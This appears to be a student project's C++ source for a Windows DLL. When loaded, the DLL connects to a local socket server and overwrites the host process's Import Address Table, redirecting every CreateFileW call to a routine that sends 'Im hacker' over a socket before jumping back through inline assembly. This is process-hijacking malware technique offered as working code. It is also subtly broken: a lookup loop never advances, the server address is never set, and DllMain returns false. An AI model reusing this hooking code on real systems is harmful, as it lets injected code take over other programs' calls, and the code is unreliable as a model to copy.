#include <Windows.h>
#include <iostream>
#include <string.h>
#include "mydll.h"

#define MAX 20
#define FILENAME L"C:\\Users\\yairb\\source\\repos\\FinalProject\\text.txt"
#define DLL_EXPORT
DWORD saved_hooked_func_addr;
using namespace std;

extern "C"
{
	int hook(PCSTR func_to_hook, PCSTR DLL_to_hook, DWORD new_func_address) {
		PIMAGE_DOS_HEADER dosHeader;
		PIMAGE_NT_HEADERS NTHeader;
		PIMAGE_OPTIONAL_HEADER32 optionalHeader;
		IMAGE_DATA_DIRECTORY importDirectory;
		DWORD descriptorStartRVA;
		PIMAGE_IMPORT_DESCRIPTOR importDescriptor;
		int index;

		// Get base address of currently running .exe
		DWORD baseAddress = (DWORD)GetModuleHandle(NULL);

		// Get the import directory address
		dosHeader = (PIMAGE_DOS_HEADER)(baseAddress);

		if (((*dosHeader).e_magic) != IMAGE_DOS_SIGNATURE) {
			return 0;
		}

		// Locate NT header
		NTHeader = (PIMAGE_NT_HEADERS)(baseAddress + (*dosHeader).e_lfanew);
		if (((*NTHeader).Signature) != IMAGE_NT_SIGNATURE) {
			return 0;
		}

		// Locate optional header
		optionalHeader = &(*NTHeader).OptionalHeader;
		if (((*optionalHeader).Magic) != 0x10B) {
			return 0;
		}

		importDirectory = (*optionalHeader).DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		descriptorStartRVA = importDirectory.VirtualAddress;
		importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(descriptorStartRVA + baseAddress);

		index = 0;
		char* DLL_name;
		// Look for the DLL which includes the function for hooking
		while (importDescriptor->Characteristics != 0) {
			DLL_name = (char*)(baseAddress + importDescriptor->Name);
			printf("DLL name: %s\n", DLL_name);
			if (!strcmp(DLL_to_hook, DLL_name))
				break;
			index++;
		}

		// exit if the DLL is not found in import directory
		if (importDescriptor[index].Name == 0) {
			printf("DLL was not found");
			return 0;
		}

		// Search for requested function in the DLL
		PIMAGE_THUNK_DATA thunkILT; // Import Lookup Table - names
		PIMAGE_THUNK_DATA thunkIAT; // Import Address Table - addresses
		PIMAGE_IMPORT_BY_NAME nameData;

		thunkILT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].OriginalFirstThunk);
		thunkIAT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].FirstThunk);
		if ((thunkIAT == NULL) or (thunkILT == NULL)) {
			return 0;
		}

		while (((*thunkILT).u1.AddressOfData != 0) & (!((*thunkILT).u1.Ordinal & IMAGE_ORDINAL_FLAG))) {
			nameData = (PIMAGE_IMPORT_BY_NAME)(baseAddress + (*thunkILT).u1.AddressOfData);
			if (!strcmp(func_to_hook, (char*)(*nameData).Name))
				break;
			thunkIAT++;
			thunkILT++;
		}

		// Hook IAT: Write over function pointer
		DWORD dwOld = NULL;
		saved_hooked_func_addr = (*thunkIAT).u1.Function;
		VirtualProtect((LPVOID) & ((*thunkIAT).u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
		(*thunkIAT).u1.Function = new_func_address;
		VirtualProtect((LPVOID) & ((*thunkIAT).u1.Function), sizeof(DWORD), dwOld, NULL);

		return 1;
	}
	void ShowMsg() {
		int client;
		client = socket(AF_INET, SOCK_STREAM, 0);
		send(client, "Im hacker", 1024, 0);

		_asm {
			pop edi
			pop esi
			pop ebx
			add esp, 0C0h
			mov esp, ebp;
			pop ebp
				jmp DWORD PTR[saved_hooked_func_addr];

		}
	}
}
BOOL APIENTRY DllMain(
	HANDLE hModule, // Handle to DLL module
	DWORD ul_reason_for_call,
	LPVOID lpReserved) // Reserved
{
	switch (ul_reason_for_call)
	{

	case DLL_PROCESS_ATTACH:
	{int client;
	int portNum = 1500; // NOTE that the port number is same for both client and server
	bool isExit = false;
	int bufsize = 1024;
	char buffer[1024];
	const char* ip = "127.0.0.1";

	struct sockaddr_in server_addr;

	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0)
	{
		std::cout << "\nError establishing socket..." << endl;
		exit(1);
	}

	std::cout << "\n=> Socket client has been created..." << endl;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(portNum);
	if (connect(client, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0)
		std::cout << "=> Connection to the server port number: " << portNum << endl;
	std::cout << "=> Awaiting confirmation from the server..." << endl; //line 40
	recv(client, buffer, bufsize, 0);
	std::cout << "=> Connection confirmed, you are good to go...";
	// A process is loading the DLL.
	PCSTR func_to_hook = "CreateFileW";
	PCSTR DLL_to_hook = "KERNEL32.dll";
	DWORD new_func_address = (DWORD)&ShowMsg;
	HANDLE hFile;
	hook(func_to_hook, DLL_to_hook, new_func_address);
	std::cout << "\n=> Connection terminated.\nGoodbye...\n";
	closesocket(client); }
		break;
	case DLL_THREAD_ATTACH:
		// A process is creating a new thread.
		break;
	case DLL_THREAD_DETACH:
		// A thread exits normally.
		break;
	case DLL_PROCESS_DETACH:
		// A process unloads the DLL.		
		break;
	}
	return false;
}

